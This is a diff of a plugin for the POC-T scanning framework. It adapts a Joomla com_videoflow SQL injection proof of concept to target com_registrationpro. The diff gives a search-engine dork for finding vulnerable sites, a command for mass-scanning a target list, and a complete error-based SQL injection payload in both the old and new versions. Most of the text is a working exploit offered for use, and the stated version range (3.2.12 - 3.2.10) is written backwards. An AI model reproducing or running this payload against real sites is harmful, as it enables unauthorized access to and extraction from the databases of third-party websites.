@@ -4,16 +4,16 @@
 # project = https://github.com/Xyntax/POC-T
 
 """
-Joomla com_videoflow SQL injection PoC
+Joomla com_registrationpro SQL injection Vulnerability
 
 Dork
-  inurl:index.php?option=com_videoflow
+  inurl:index.php?option=com_registrationpro
 version
-  1.1.3 - 1.1.5
+  3.2.12 - 3.2.10
 Type
   boolean-based blind & error-based
 Usage
-  python POC-T.py -T -m joomla-videoflow-sqli -f ./data/joomla.txt -t 50
+  python POC-T.py -T -m joomla-registrationpro-sqli -f ./data/joomla.txt -t 50
 
 """
 
@@ -27,7 +27,7 @@ def poc(url):
         url = 'http://' + url
     for each in iterate_path(url):
         plain, cipher = randomMD5(3)
-        payload = "/index.php?option=com_videoflow&task=search&vs=1&searchword=-3920%27%29%20OR%201%20GROUP%20BY%20CONCAT%280x71786a7a71%2C%28MID%28%28IFNULL%28CAST%28md5%28{plain}%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x716b6b7a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23".format(plain=plain)
+        payload = "/index.php?option=com_registrationpro&view=calendar&Itemid=27&listview=2&month=6&year=1 AND (SELECT 7804 FROM(SELECT COUNT(*),CONCAT(0x7176786b71,(MID((IFNULL(CAST(md5({plain}) AS CHAR),0x20)),1,54)),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)".format(plain=plain)
         if '?' in each:
             continue
         target_url = url.rstrip('/') + payload
